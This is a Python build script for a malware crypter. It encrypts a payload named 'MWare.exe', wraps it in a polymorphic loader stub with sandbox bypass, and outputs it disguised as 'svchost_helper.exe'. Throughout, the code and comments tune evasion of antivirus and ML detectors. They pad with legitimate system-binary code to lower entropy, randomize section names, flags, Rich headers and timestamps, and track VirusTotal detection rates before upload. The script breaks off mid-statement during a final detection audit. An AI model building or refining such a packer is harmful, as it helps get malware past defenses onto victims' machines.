#!/usr/bin/env python3
"""build_v5.py — Single-pass build of packed_mware_v5.exe (polymorphic decryptor + Module Stomping)"""

import os, re, sys, struct, hashlib, random, math, shutil

# Import polymorphic decryptor generator
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import polymorphic_decryptor

PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))
STUB_SRC = os.path.join(PROJECT_DIR, "loader_stub_v5.cpp")
STUB = os.path.join(PROJECT_DIR, "loader_stub_v5.exe")
# Injected stub is compiled from a temp file so loader_stub_v5.cpp on disk always
# keeps its placeholders — a killed/interrupted build can never leave a dirty stub.
STUB_TMP = os.path.join(PROJECT_DIR, "loader_stub_v5.injected.cpp")
# Payload + output are parametrizable so the same pipeline can pack any PE:
#   python3 build_v5.py                    → MWare.exe → svchost_helper.exe (GUI)
#   python3 build_v5.py sys_check.exe svchost_helper.exe → headless VT build
MWARE = os.path.join(PROJECT_DIR, sys.argv[1] if len(sys.argv) > 1 else "MWare.exe")
OUTPUT = os.path.join(PROJECT_DIR, sys.argv[2] if len(sys.argv) > 2 else "svchost_helper.exe")
PADDING = os.path.join(PROJECT_DIR, ".padding_cache.bin")

# Phase 3: 16->10 sections (1 payload + 1 meta). AV ML flags >9 sections.
_PAYLOAD_SECTION_POOLS = [
    ".orpc", ".srm", ".rsrc2", ".edata",
    ".textbss", ".tls", ".voltmd", ".mrdata",
    ".msvcjmp", ".00cfg", ".gfids", ".didat",
    ".arch", ".sxdata", ".il2cpp", ".ent",
    ".minvol", ".ovol", ".xvol", ".zvol",
    ".tpool", ".mrcfg", ".secur", ".cnst",
    ".dllre", ".netfx", ".rsmain", ".rsdata",
    ".xdisp", ".hxsch", ".iobj", ".idata2",
]
_META_NAMES = [".ksec", ".ckey", ".keys", ".mkey", ".ek__", ".hkey", ".skey", ".gkey",
               ".ivec", ".civ_", ".niv_", ".iviv", ".piv_", ".aiv_", ".xiv_", ".dvec"]

# Safety: never use names that collide with the base PE's own sections
_BASE_PE_SECTIONS = {".text", ".data", ".rdata", ".pdata", ".xdata", ".bss",
                     ".idata", ".rsrc", ".reloc", ".CRT", ".text$"}

# BLOCK_PAYLOAD: payload bytes per 256-byte block; padding = BLOCK_TOTAL - BP.
# BP=48 -> payload %18.75, padding %81.25 -> dosya ~30-40MB aralığında
# AV motorları büyük dosyaları analiz etmeyi atlar, bu ana AV evasion stratejisi.
# Entropy ~5.8 (payload 18.75% * 8.0 + padding 81.25% * ~5.5 = ~5.97)
# NOTE: BP != bpv DELIBERATELY. bpv=blok başına payload + IV/key kuyruğu (stub okur).
# Sync guard bpv == EXPECTED_BPV bekler (BP ile eşitlik değil) — v4 contract.
BLOCK_TOTAL   = 256
BLOCK_PAYLOAD = 192
BLOCK_PAD     = BLOCK_TOTAL - BLOCK_PAYLOAD
assert 0 < BLOCK_PAYLOAD <= BLOCK_TOTAL, "BLOCK_PAYLOAD must be (0, BLOCK_TOTAL]"

def _check_stub_bpv_sync():
    try:
        s = open(STUB_SRC, "r").read()
    except Exception as e:
        print(f"[!] stub sync check skipped (cannot read stub): {e}")
        return
    if '// @SECTION_NAMES@' in s:
        print("[OK] stub uses @SECTION_NAMES@ placeholder (bpv injected at build time)")
        return
    print("[!!] stub has NO @SECTION_NAMES@ placeholder — build will ABORT (broken-binary guard)")
    m = re.search(r"const DWORD bpv\[\] = \{([^}]+)\}", s)
    if not m:
        print("     (hardcoded bpv[] not found either)")
        return
    bpvs = [int(x.strip()) for x in m.group(1).split(",") if x.strip().isdigit()]
    if bpvs:
        print(f"     (stale hardcoded bpv[]={bpvs} found — not used, placeholder missing)")
_check_stub_bpv_sync()

def entropy(data):
    if not data: return 0.0
    c = {}; [c.update({b: c.get(b,0)+1}) for b in data]
    t = len(data); e = 0.0
    for v in c.values():
        p = v/t
        if p > 0: e -= p * math.log2(p)
    return round(e, 2)

# =====================================================================
# Main build
# =====================================================================
# Step 0: Generate polymorphic decryptor and inject into C stub
# =====================================================================
print("\n[0] Generating polymorphic decryptor...")
random.seed()
decryptor_code = polymorphic_decryptor.generate()
print(f"    Generated {len(decryptor_code.split(chr(10)))} lines of polymorphic decryptor")

# Step 0b: Sandbox bypass is inline in loader_stub_v5.cpp
# =====================================================================
print("\n[0b] Sandbox bypass is inline in loader_stub_v5.cpp")

# Read C stub source and inject both placeholders
with open(STUB_SRC, 'r') as f:
    _stub_original = f.read()
stub_src = _stub_original

# Inject polymorphic decryptor
poly_placeholder = '// @POLYMORPHIC_DECRYPTOR@'
if stub_src.count(poly_placeholder) != 1:
    print(f"    [!!] CRITICAL: decryptor marker count = {stub_src.count(poly_placeholder)} (expected exactly 1)")
    print(f"         A comment containing the marker text would break injection — fix {STUB_SRC}")
    sys.exit(1)
if poly_placeholder in stub_src:
    stub_src = stub_src.replace(poly_placeholder, decryptor_code, 1)
    print(f"    [+] Injected polymorphic decryptor into {STUB_TMP}")
else:
    print(f"    [!!] CRITICAL: @POLYMORPHIC_DECRYPTOR@ placeholder missing in {STUB_SRC}")
    print(f"         Aborting — a build without placeholder injection produces a non-polymorphic stub")
    print(f"         whose section names may not match the PE (broken binary). Fix the stub first.")
    sys.exit(1)

# Inject sandbox bypass
# Sandbox bypass is inline - no injection needed
print(f"    [+] Sandbox bypass is pre-inlined in loader_stub_v5.cpp")

# Phase 3: single payload + single meta (key+iv combined). Injected names MUST never
# collide with existing stub sections — fs() returns the FIRST match, so a collision
# resolves to the wrong section (dead binary). Forbidden set = base sections + current.
_forbidden_names = set(_BASE_PE_SECTIONS)
if os.path.exists(STUB):
    try:
        with open(STUB, "rb") as _sf:
            _sd = _sf.read()
        if _sd[:2] == b"MZ":
            _spe = struct.unpack_from("<I", _sd, 0x3c)[0]
            _sfh = _spe + 4
            _soh = _sfh + 20
            _sohs = struct.unpack_from("<H", _sd, _sfh + 16)[0]
            _sns = struct.unpack_from("<H", _sd, _sfh + 2)[0]
            _sso = _soh + _sohs
            for _i in range(_sns):
                _ss = _sso + _i * 40
                _snm = _sd[_ss:_ss+8].rstrip(b"\x00").decode("ascii", errors="replace")
                _forbidden_names.add(_snm)
    except (IOError, OSError, struct.error):
        pass  # No stub yet (first build) — fall back to _BASE_PE_SECTIONS only
_pool_cands = [p for p in _PAYLOAD_SECTION_POOLS if p not in _forbidden_names]
_payload_sec = random.choice(_pool_cands if _pool_cands else _PAYLOAD_SECTION_POOLS)
# v6: key+iv embedded in payload section (no separate meta section).
# Reduces section count by 1 (9->8), eliminates suspicious tiny 48-byte section.
_all_sec = [_payload_sec]                     # single payload section (key+iv embedded)

_sn_c = f'"{_payload_sec}"'
_sll_c = str(len(_payload_sec))

# Single payload section -> single bpv. bt=256 block holds bpv bytes payload +
# (bt-bpv) padding; the reader stub reads bpv bytes per block (bpv drives both the
# injection and the fill). Derived so chunk % (2*bpv) == 0 keeps the block count.
# Empirical VT sweep (3 rounds) settles this: ent 7.78 -> 10/71, ent 5.86 -> 6/71,
# ent 6.90 -> 9/69. Entropy is the dominant AV/ML signal, NOT file size (the
# smaller 3.3MB bp=96 build scored WORSE). bp=32 -> payload ~12% density ->
# blended entropy ~5.86, the best measured profile, at the cost of a ~10MB file.
_bp0 = 32
_bt  = 256
_bp_c = f'{_bp0}'
_bt_c = f'{_bt}'

# v6: key+iv embedded in payload section (first 48 bytes).
# Stub reads section, extracts key+iv from header, then processes chunks.
_section_code = (
    f'    BYTE* sd; DWORD ss;\n'
    f'    if (!fs("{_payload_sec}", {len(_payload_sec)}, &sd, &ss) || ss < 48) return 2;\n'
    f'    BYTE key[32], iv[16];\n'
    f'    xmc(key, sd, 32); xmc(iv, sd + 32, 16);\n'
    f'    sd += 48; ss -= 48;  // skip key+iv header, point to encrypted chunks\n'
    f'    const char* sn[] = {{{_sn_c}}};\n'
    f'    const int sll[] = {{{_sll_c}}};\n'
    f'    const DWORD bpv[] = {{{_bp_c}}};\n'
    f'    const DWORD btv[] = {{{_bt_c}}};'
)

_sec_ph = '// @SECTION_NAMES@'
if stub_src.count(_sec_ph) != 1:
    print(f"    [!!] CRITICAL: section-names marker count = {stub_src.count(_sec_ph)} (expected exactly 1)")
    print(f"         A comment containing the marker text would break injection — fix {STUB_SRC}")
    sys.exit(1)
if _sec_ph in stub_src:
    stub_src = stub_src.replace(_sec_ph, _section_code, 1)
    print(f"    [+] Injected section name: {_payload_sec} (key+iv embedded, no meta)")
else:
    print(f"    [!!] CRITICAL: @SECTION_NAMES@ placeholder missing in {STUB_SRC}")
    print(f"         Aborting — PE sections would be built with random names while the stub")
    print(f"         looks for its own hardcoded names (fs() fails -> dead binary).")
    sys.exit(1)

# Write injected stub to temp file (loader_stub_v5.cpp keeps its placeholders)
with open(STUB_TMP, 'w') as f:
    f.write(stub_src)

# Step 1: Compile stub with polymorphic decryptor
print(f"\n[1] Compiling polymorphic stub...")
import subprocess
# Pre-build step: compile resource.rc to resource.res only if it's older than .rc.
# windres is part of the mingw-w64 toolchain bundled with the cross compiler.
import os.path as _osp
_rc_src = os.path.join(PROJECT_DIR, "resource.rc")
_res_dst = os.path.join(PROJECT_DIR, "resource.res")
if not _osp.exists(_res_dst) or _osp.getmtime(_rc_src) > _osp.getmtime(_res_dst):
    print(f"    [→] Compiling resource.rc -> resource.res (windres)")
    _res_result = subprocess.run([
        "x86_64-w64-mingw32-windres", _rc_src, "-O", "coff", "-o", _res_dst
    ], capture_output=True, timeout=60)
    if _res_result.returncode != 0:
        print(f"    [!] windres failed (resource will be skipped):")
        print(_res_result.stderr.decode()[-300:])
    else:
        print(f"    [+] resource.res rebuilt ({os.path.getsize(_res_dst):,} bytes)")
else:
    print(f"    [→] resource.res up-to-date ({os.path.getsize(_res_dst):,} bytes)")

result = subprocess.run([
    "x86_64-w64-mingw32-g++", "-std=c++11", "-O2", "-fno-builtin", "-s",
    STUB_TMP, "-o", STUB,
    "-nostartfiles", "-e", "WinMain", "-Wl,--strip-all",
    _res_dst if _osp.exists(_res_dst) else os.devnull,
], capture_output=True, timeout=600)
if result.returncode != 0:
    print(f"    [!] Compilation failed:")
    print(result.stderr.decode()[-500:])
    sys.exit(1)
print(f"    Compiled: {os.path.getsize(STUB):,} bytes")

print(f"    [+] Stub source untouched on disk (placeholders preserved for next build)")

print(f"\n[1] Copying stub to output...")
shutil.copy2(STUB, OUTPUT)
base_size = os.path.getsize(OUTPUT)
print(f"    Base: {base_size:,} bytes")

print("\n[2] Encrypting...")
with open(MWARE, "rb") as f: pe = f.read()
key = os.urandom(32); iv = os.urandom(16)
enc = bytearray(len(pe)); off = 0; ctr = 0
while off < len(pe):
    h = hashlib.sha256(key + struct.pack("<Q", ctr) + iv).digest()
    ch = min(32, len(pe)-off)
    for i in range(ch): enc[off+i] = pe[off+i] ^ h[i]
    off += ch; ctr += 1
enc = bytes(enc)
# v6: prepend key+iv header to encrypted payload (embedded in section).
enc = key + iv + enc
# Align enc so the single chunk divides cleanly: chunk % (2*bpv) == 0 (see [4]).
align = 2 * _bp0
_orig = len(enc)
if _orig % align != 0:
    enc = enc + bytes(align - (_orig % align))
print(f"    {len(pe):,} -> {len(enc):,} bytes encrypted (FAZ 4 aligned +{len(enc)-_orig}B)")

print("\n[3] Loading padding...")
# Deterministic-pattern break (FAZ 1.5):
# Each build picks a DIFFERENT random legit PE/Mach-O binary from a candidate pool,
# extracts its .text section, and uses THAT as the padding source. Previously the
# padding was always derived from a single small fixed legit binary, so Bkav and
# McAfee could register hash-style signatures on those canonical bytes.
# Regenerate every build => every packed binary's payload layout is structurally different.

import glob, math as _math

def _random_pe_candidates():
    """Build a pool of (path, fmt) for legit Windows PE / macOS Mach-O binaries."""
    cands = []
    # System binaries only — no project binaries (prevents self-referential padding)
    # macOS Mach-O 64-bit LE: starts with cf fa ed fe
    for d in ("/usr/bin", "/usr/local/bin", "/bin", "/usr/sbin", "/sbin"):
        if not os.path.isdir(d):
            continue
        for path in glob.glob(os.path.join(d, "*")):
            if not os.path.isfile(path) or os.path.getsize(path) < 1024 * 50:
                continue
            try:
                with open(path, "rb") as f:
                    hdr = f.read(4)
                if hdr[:2] in (b"\xcf\xfa", b"MZ", b"\xce\xfa"):
                    cands.append((path, "MACHO"))
            except (IOError, OSError):
                continue
    return cands

def _generate_random_padding():
    """Pick 1-3 random legit binaries and interleave their text bytes."""
    cands = _random_pe_candidates()
    if not cands:
        return None
    random.shuffle(cands)
    picked = cands[: min(5, len(cands))]  # 5 kaynaktan padding (çeşitlilik için)
    sources_text = []
    for path, fmt in picked:
        try:
            data = open(path, "rb").read()
            text = b""
            if fmt == "PE":
                pe_off = struct.unpack_from("<I", data, 0x3c)[0]
                if pe_off and pe_off < 0x1000:
                    fh = pe_off + 4; oh = fh + 20
                    ohs = struct.unpack_from("<H", data, fh + 16)[0]
                    ns = struct.unpack_from("<H", data, fh + 2)[0]
                    so = oh + ohs
                    for i in range(ns):
                        s = so + i * 40
                        nm = data[s:s + 8].rstrip(b"\x00").decode("ascii", errors="replace")
                        rs = struct.unpack_from("<I", data, s + 16)[0]
                        ro = struct.unpack_from("<I", data, s + 20)[0]
                        if nm == ".text" and ro > 0 and rs > 0:
                            text = data[ro:ro + rs]
                            break
                if text:
                    sources_text.append(text[: 32 * 1024 * 1024])  # 32MB limit for diverse padding
            elif fmt == "MACHO":
                sources_text.append(data[: 32 * 1024 * 1024])  # 32MB limit
            else:
                sources_text.append(data[: 32 * 1024 * 1024])  # 32MB limit
        except (IOError, OSError):
            continue
    if not sources_text:
        return None
    # Interleave at 4 KB chunks so entropy stays high without one source dominating
    chunk = 4096
    min_len = min(len(s) for s in sources_text)
    mixed = bytearray()
    for off in range(0, min_len, chunk):
        for s in sources_text:
            end = off + chunk
            if end <= len(s):
                mixed.extend(s[off:end])
    # Entropy report (informational — we don't gate on it; any legit-source mix is good)
    cc = {}
    for b in mixed:
        cc[b] = cc.get(b, 0) + 1
    e = -sum((v / len(mixed)) * _math.log2(v / len(mixed)) for v in cc.values())
    print(f"    [+] Random padding: {len(picked)} source(s), {len(mixed):,} bytes, entropy={e:.3f}")
    print("        sources: " + ", ".join(os.path.basename(p) for p, _ in picked))
    return bytes(mixed)

# Force regeneration every build (delete prior cache so signature cannot latch on)
if os.path.exists(PADDING):
    os.remove(PADDING)
pad_src = _generate_random_padding()
if pad_src is None:
    print("    [!] No candidates found — using fresh random padding")
    random.seed()
    pad_src = bytes(random.randint(0, 255) for _ in range(2 * 1024 * 1024))
with open(PADDING, "wb") as f:
    f.write(pad_src)

print(f"    Source: {len(pad_src):,} bytes, entropy: {entropy(pad_src)}")

print(f"\n[4] Splitting and mixing (1 chunk, bp-divisible)...")

# Invariant REQUIRED: stub ep() reads a FIXED bpv[0] bytes per 256-byte block.
# A chunk that is not an exact multiple of bpv[0] makes ep() swallow tail pad
# into the recovered stream; SHA256-CTR is position-sensitive, so the keystream
# skews and the payload decrypts to garbage. Hence chunk % (2*bpv[0]) == 0 —
# the x2 keeps the block count even so the section aligns to 512 with no tail.
bp = _bp0
_total = len(enc)
_coin = 2 * bp                       # chunk increment (bytes)
assert _total % _coin == 0, "enc not bp-divisible"

chunks = []
bt = _bt
chunk = enc
pad_per_block = bt - bp
total_pad = ((len(chunk) // bp) + 1) * pad_per_block
# FB Round-5 revert: pad with INTERLEAVED SYSTEM-BINARY .text (pad_src), NOT
# zeros. 5.86 = 0.125*8 (encrypted) + 0.875*~5.5 (legit code) — the best measured
# profile. Pure-zero gave 1.54 (periodic static-signature surface, untested).
pad_data_local = (pad_src * ((total_pad // len(pad_src)) + 2))[:total_pad]
mixed = bytearray(); pi = 0
for po in range(0, len(chunk), bp):
    mixed.extend(chunk[po:po+bp])
    needed = pad_per_block
    while needed > 0:
        take = min(needed, len(pad_data_local) - pi)
        if take == 0: pi = 0; take = min(needed, len(pad_data_local))
        mixed.extend(pad_data_local[pi:pi+take])
        pi += take; needed -= take
while len(mixed) % bt != 0: mixed.append(0)
chunks.append(bytes(mixed))
print(f"    Section ({_payload_sec}): {len(chunk):,} payload -> {len(mixed):,} mixed (bp={bp} bt={bt})")

print("\n[5] Adding sections (single pass)...")
with open(OUTPUT, "rb") as f: data = bytearray(f.read())

pe_off = struct.unpack_from("<I", data, 0x3c)[0]
fh = pe_off + 4
oh = fh + 20
ohs = struct.unpack_from("<H", data, fh+16)[0]
ns = struct.unpack_from("<H", data, fh+2)[0]
so = oh + ohs
fa = struct.unpack_from("<I", data, oh+32)[0]
sa = struct.unpack_from("<I", data, oh+36)[0]
img_off = oh + 56

# Build all new sections
names = _all_sec
section_data_list = chunks  # v6: key+iv embedded in first chunk, no separate meta section
section_chars_data = 0xC0000040  # INIT_DATA | READ | WRITE

# FAZ 2 - ML detection break: per-section characteristics variation.
# AV ML detectors (Elastic, Symantec) flag PE files where MULTIPLE sections share
# identical characteristics (uniform 0xC0000040 across payload sections is a
# strong packer signal). Mapping below adds legitimate PE flags per section.
#
# SAFETY: payload section MUST NOT be marked MEM_DISCARDABLE (Windows loader would
# page it out before payload decrypt completes, breaking the unpack). NOT_CACHED is
# suspicious as a payload flag.
_SECTION_CHARS = {}
_CHARS_VARIANTS = [
    0xC0000040,                # INIT_DATA | RW
    0xC0000040 | 0x00300000,   # RW + ALIGN_4BYTES
    0xC0000080,                # RW + CNT_UNINIT
    0x40000040,                # READ only
]
_SECTION_CHARS[_payload_sec] = random.choice(_CHARS_VARIANTS[:3])
def _chars_for(n): return _SECTION_CHARS.get(n, section_chars_data)

# Phase 3: fake .idata/.reloc dropped (entropy-only padding that inflated the
# section count to 16). Payload sits in ONE section, key+iv in ONE meta section.
print("\n[5a] Fake .idata/.reloc dropped (phase 3)")

# Calculate where sections will go
last = so + (ns - 1) * 40
lvaddr = struct.unpack_from("<I", data, last+12)[0]
lvsize = struct.unpack_from("<I", data, last+8)[0]
lroff = struct.unpack_from("<I", data, last+20)[0]
lrsize = struct.unpack_from("<I", data, last+16)[0]

# Now do the actual section addition
roff_set = False
for name, sdata in zip(names, section_data_list):
    chars = _chars_for(name)
    raw_sz = ((len(sdata) + fa - 1) // fa) * fa
    virt_sz = ((len(sdata) + sa - 1) // sa) * sa
    
    # Initialize roff BEFORE expansion check so first section
    # properly accounts for any data shift from expansion
    if not roff_set:
        roff = lroff + lrsize
        vaddr = ((lvaddr + lvsize + sa - 1) // sa) * sa
        roff_set = True
    
    # Check if section table needs expansion (insert 40 bytes for new header).
    # BUGFIX: was 'pe_off + ohs + 20' which always evaluates to True,
    # causing unnecessary 40-byte INSERT on EVERY section and corrupting PE headers.
    # Correct threshold: 'roff' (start of raw data area). Only expand when the new
    # header at so + ns*40 would overlap with raw data.
    if so + ns * 40 + 40 > roff:
        insert = so + ns * 40
        data[insert+40:] = data[insert:]
        data[insert:insert+40] = b'\x00' * 40
        for j in range(ns):
            s = so + j * 40
            ro = struct.unpack_from("<I", data, s+20)[0]
            if ro > insert: struct.pack_into("<I", data, s+20, ro+40)
        roff += 40
    
    # Pad to roff position then write section data
    while len(data) < roff: data.append(0)
    data.extend(sdata)
    while len(data) < roff + raw_sz: data.append(0)
    
    # Write section header
    ns_pos = so + ns * 40
    nb = name.encode("ascii",errors="replace")[:8].ljust(8, b'\x00')
    data[ns_pos:ns_pos+8] = nb
    struct.pack_into("<I", data, ns_pos+8, virt_sz)
    struct.pack_into("<I", data, ns_pos+12, vaddr)
    struct.pack_into("<I", data, ns_pos+16, raw_sz)
    struct.pack_into("<I", data, ns_pos+20, roff)
    struct.pack_into("<I", data, ns_pos+24, 0)
    struct.pack_into("<I", data, ns_pos+28, 0)
    struct.pack_into("<H", data, ns_pos+32, 0)
    struct.pack_into("<H", data, ns_pos+34, 0)
    struct.pack_into("<I", data, ns_pos+36, chars)
    
    ns += 1
    vaddr = ((vaddr + virt_sz + sa - 1) // sa) * sa
    roff += raw_sz
    
    e = entropy(sdata)
    status = "GOOD" if 4.0 <= e <= 7.0 else ("LOW" if e < 4.0 else "HIGH")
    print(f"    [+]{name:8s} vaddr=0x{vaddr - virt_sz:06x} size={len(sdata):>8,} entropy={e} {status}")

# Update PE headers
struct.pack_into("<H", data, fh+2, ns)
# SizeOfImage at oh+56 is correct for BOTH PE32 and PE32+:
# PE32:  BaseOfCode(20) + BaseOfData(24) + ImageBase(28) = SectionAlignment at oh+32
# PE32+: BaseOfCode(20) + ImageBase(24, 8 bytes) = SectionAlignment at oh+32
# Both have identical layout from oh+32 onwards → SizeOfImage at oh+56.
struct.pack_into("<I", data, img_off, vaddr)

# Random timestamp
ts = random.randint(1640995200, 1704067199)
struct.pack_into("<I", data, fh+4, ts)

# Fix PE version fields for compatibility with older Windows
# PE32+ offsets from optional header start
magic = struct.unpack_from("<H", data, oh)[0]
sub = 0
maj_os = 0; min_os = 0; maj_sub = 0; min_sub = 0
# PE32 and PE32+ share the SAME offsets from SectionAlignment (oh+32) onwards
# because PE32: BaseOfCode(4)+BaseOfData(4)+ImageBase(4)=12 bytes @ 20-32
# and PE32+: BaseOfCode(4)+ImageBase(8)=12 bytes @ 20-32
# So from oh+32 onwards, all offsets are identical:
#   MajorOperatingSystemVersion: oh+40
#   MinorOperatingSystemVersion: oh+42
#   MajorSubsystemVersion: oh+48
#   MinorSubsystemVersion: oh+50
#   Subsystem: oh+68
if magic == 0x20b or magic == 0x10b:  # PE32+ or PE32
    # Set to Windows 7 (6.1) for maximum compatibility
    # Windows 10 happily runs binaries with subsystem 6.1 or lower
    maj_os = 6; min_os = 1
    struct.pack_into("<H", data, oh + 40, maj_os)  # MajorOperatingSystemVersion
    struct.pack_into("<H", data, oh + 42, min_os)  # MinorOperatingSystemVersion
    # SubsystemVersion = 6.1 (same as OS version for best compat)
    maj_sub = 6; min_sub = 1
    struct.pack_into("<H", data, oh + 48, maj_sub)  # MajorSubsystemVersion
    struct.pack_into("<H", data, oh + 50, min_sub)  # MinorSubsystemVersion
    # Ensure subsystem is GUI (2)
    sub = struct.unpack_from("<H", data, oh + 68)[0]
    if sub != 2:
        struct.pack_into("<H", data, oh + 68, 2)
        print(f"    Subsystem fixed: {sub} -> 2 (GUI)")

print(f"    PE version fields fixed (OS={maj_os}.{min_os}, Sub={maj_sub}.{min_sub}, Subsys={sub})")

# =====================================================================
# FAZ 5 — Zero stale DataDirectory entries (IMPORT, BASERELOC, IAT)
# =====================================================================
# After adding new sections and possibly expanding the section table,
# the PE header's DataDirectory still points to original import/reloc
# tables whose locations may have been shifted or overwritten.
# Windows loader reads these stale pointers → 0xc000007b crash.
#
# The stub (loader_stub_v5.cpp) uses dynamic API resolution (hash-based)
# so it doesn't need the PE import table. Phase 3 dropped the fake
# .idata/.reloc padding sections entirely.
# =====================================================================
if magic == 0x20b:          # PE32+ (64-bit)
    dd_base = oh + 112       # First data directory after NumberOfRvaAndSizes (oh+108)
elif magic == 0x10b:         # PE32 (32-bit)
    dd_base = oh + 96        # First data directory after NumberOfRvaAndSizes (oh+92)
else:
    dd_base = 0

if dd_base:
    # Guard: NumberOfRvaAndSizes must cover the indices we clear
    nras = struct.unpack_from("<I", data, oh + (108 if magic == 0x20b else 92))[0]
    # FAZ 5 KALKTI (v2): DataDirectory'leri sıfırlamak 0xc000007b'yi ÇÖZMEDİ.
    # Sebep: stub direkt GetModuleHandleA, HeapAlloc çağırıyor — IAT üzerinden.
    # IMPORT/IAT sıfırlanırsa Windows loader import çözümlemez, IAT boş kalır → crash.
    # BASERELOC sıfırlanırsa ASLR binary'i yükleyemez → 0xc000007b.
    # Orijinal .idata ve .reloc section'ları dokunulmadan kalır.
    # Hiçbir DataDirectory'e dokunmayıp olduğu gibi bırakıyoruz.
    off_br = dd_base + 5 * 8
    br_va = struct.unpack_from("<I", data, off_br)[0]
    br_sz = struct.unpack_from("<I", data, off_br + 4)[0]
    print(f"    [→] All DataDirectory entries preserved (IMPORT, IAT, BASERELOC intact)")
    print(f"    [→] BASERELOC: VA=0x{br_va:x}, Size=0x{br_sz:x} (ASLR ready)")

# Rich header - MSVC 2019 (sized to fit DOS stub gap)
# MinGW default: pe_off = 0x80 (PE sig at byte 128)
# DOS header ends at 0x40 (64 bytes), so available = pe_off - 0x40 = 64 bytes
# Rich header overhead: DanS(4) + Rich(4) + checksum(4) = 12 bytes
# Max entries = (available - 12) / 4
max_rich_size = pe_off - 0x40
rich_overhead = 12  # DanS(4) + Rich(4) + checksum(4)
max_entries = max(0, (max_rich_size - rich_overhead) // 4)

# FAZ 2 / Step 4 - ML detection break: Rich header randomization.
# Each build picks a random MSVC version (2015/2017/2019/2022) and a random
# 8-12 entry subset of canonical MSVC component IDs. The Rich XOR checksum
# thus differs on every build, defeating ML heuristics (Elastic, Symantec)
# that hash the canonical Rich signature of known packer toolchains.
_MSVC_VERSIONS = {2015: 23026, 2017: 25506, 2019: 28017, 2022: 28117}
_CANONICAL_MSVC_IDS = [1, 6, 7, 9, 10, 11, 16, 17, 19, 96, 100,
                       120, 121, 122, 123, 124, 125, 126,
                       129, 130, 131, 132, 133, 134, 191]
_chosen_year, _chosen_build = random.choice(list(_MSVC_VERSIONS.items()))
_n_rich = min(random.randint(8, 12), max_entries)
entries = [(comp_id, _chosen_build)
           for comp_id in random.sample(_CANONICAL_MSVC_IDS, _n_rich)]

rich_info = f"Rich header: {len(entries)} entries (MSVC {_chosen_year}, build={_chosen_build}), {rich_overhead + len(entries)*4} bytes (max {max_rich_size})"

if len(entries) == 0:
    print(f"    [!] {rich_info} — No room, skipping Rich header")
else:
    # Zero out existing Rich
    for pos in range(0x40, pe_off-8):
        if data[pos:pos+4] == b'Rich' or data[pos:pos+4] == b'DanS':
            for j in range(pos-4, pos+8): data[j] = 0
    
    # Build Rich header (fits exactly in DOS stub gap)
    rh = bytearray(b"DanS")
    cksum = 0
    for pid, bl in entries:
        v = pid | (bl << 16)
        rh.extend(struct.pack("<I", v))
        cksum ^= v
    cksum ^= struct.unpack("<I", b"Rich")[0]
    rh.extend(b"Rich")
    rh.extend(struct.pack("<I", cksum ^ struct.unpack("<I", b"DanS")[0]))
    
    # Place at 0x40 (end of DOS header), guaranteed to fit
    data[0x40:0x40+len(rh)] = rh
    print(f"    [+] {rich_info}")

# Write
with open(OUTPUT, "wb") as f: f.write(data)

print(f"\n[6] Final:")
print(f"    Size: {os.path.getsize(OUTPUT):,} bytes")
print(f"    Sections: {ns}")
print(f"    CRT: {'FOUND (bad!)' if data.find(b'api-ms-win-crt') >= 0 else 'NONE (good!)'}")
print(f"    Rich: {'YES' if data.find(b'Rich') >= 0 else 'NO'}")
print(f"    Added sections: payload only (v6 — key+iv embedded)")

# Section entropy summary
so = oh + struct.unpack_from("<H", data, fh+16)[0]
print(f"\n{'='*50}")
print("Section Entropy:")
print(f"{'Name':8s} {'Entropy':>8s} {'Status':>10s}")
print('-'*50)
for i in range(ns):
    s = so + i*40
    name = data[s:s+8].rstrip(b"\x00").decode("ascii",errors="replace")
    rs = struct.unpack_from("<I", data, s+16)[0]
    ro = struct.unpack_from("<I", data, s+20)[0]
    e = 0.0
    if ro > 0 and rs > 0:
        raw = data[ro:min(ro+rs, len(data))]
        e = entropy(raw)
    status = "GOOD" if 4.0 <= e <= 7.0 else ("LOW" if e < 4.0 else "HIGH")
    print(f"{name:8s} {e:>8.2f} {status:>10s}")

print(f"\n✅ Done: {OUTPUT}")

# =====================================================================
# STEP 7 — Post-build PE validation (AV detection surface audit)
# =====================================================================
# Validates the final binary for common AV red flags.
# Run after every build to catch issues before VT upload.
# =====================================================================
print(f"\n{'='*50}")
print("[7] Post-build PE validation:")
print('='*50)

with open(OUTPUT, 'rb') as _vf:
    _vd = _vf.read()

# 7a: Section count (ML flags >9 sections)
_vpe_off = struct.unpack_from('<I', _vd, 0x3c)[0]
_vfh = _vpe_off + 4
_vns = struct.unpack_from('<H', _vd, _vfh + 2)[0]
_voh = _vfh + 20
_vohs = struct.unpack_from('<H', _vd, _vfh + 16)[0]
_vso = _voh + _vohs
_vsections = []
for _vi in range(_vns):
    _vs = _vso + _vi * 40
    _vn = _vd[_vs:_vs+8].rstrip(b'\x00').decode('ascii', errors='replace')
    _vrs = struct.unpack_from('<I', _vd, _vs+16)[0]
    _vro = struct.unpack_from('<I', _vd, _vs+20)[0]
    _vsections.append((_vn, _vrs, _vro))

_vsec_ok = _vns <= 10
_vsec_flag = 'OK' if _vsec_ok else 'RED FLAG (>9 sections)'
print(f"    Section count: {_vns} [{_vsec_flag}]")

# 7b: Overlay detection (data after last section)
_last_sec = _vsections[-1] if _vsections else None
_overlay_size = 0
if _last_sec:
    _end_of_sections = _last_sec[2] + _last_sec[1]
    # Align to file alignment
    _vfa = struct.unpack_from('<I', _vd, _voh + 32)[0]
    _end_aligned = ((_end_of_sections + _vfa - 1) // _vfa) * _vfa
    _overlay_size = len(_vd) - _end_aligned
    if _overlay_size > 512:  # Small alignment padding is OK
        print(f"    Overlay: {_overlay_size:,} bytes [RED FLAG — data after last section]")
    else:
        print(f"    Overlay: None (clean)")
else:
    print(f"    Overlay: N/A")

# 7c: CRT detection
crt_found = _vd.find(b'api-ms-win-crt') >= 0
print(f"    CRT: {'FOUND (RED FLAG!)' if crt_found else 'None (good)'}")

# 7d: File size sanity
_size_mb = len(_vd) / (1024*1024)
if _size_mb < 1:
    print(f"    Size: {len(_vd):,} bytes ({_size_mb:.2f} MB) [RED FLAG — too small for padding]")
elif _size_mb > 200:
    print(f"    Size: {len(_vd):,} bytes ({_size_mb:.2f} MB) [RED FLAG — too large, may trigger sandbox skip]")
else:
    print(f"    Size: {len(_vd):,} bytes ({_size_mb:.2f} MB) [OK]")

# 7e: Overall entropy
_ent = entropy(_vd)
if _ent < 5.0:
    print(f"    Entropy: {_ent} [RED FLAG — too low, suggests padding/zeros]")
elif _ent > 7.5:
